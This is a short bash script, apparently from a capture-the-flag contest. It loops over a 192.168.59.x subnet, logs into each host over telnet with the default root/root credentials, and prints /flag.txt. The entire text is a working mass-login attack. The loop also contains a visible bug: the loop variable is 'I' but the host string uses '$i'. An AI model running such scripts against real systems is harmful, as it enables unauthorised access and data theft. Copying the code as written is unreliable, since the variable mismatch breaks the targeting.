port="23"
user="root"
passwd="root"
for I in `seq 1 255`
do
{
    host="192.168.59.$i"
    {
        sleep 3
        echo  "$user"
        sleep 2
        echo  "$passwd"
        sleep 1
        echo "cat /flag.txt"
        sleep 1            
    } | telnet "$host" "$port"
}
done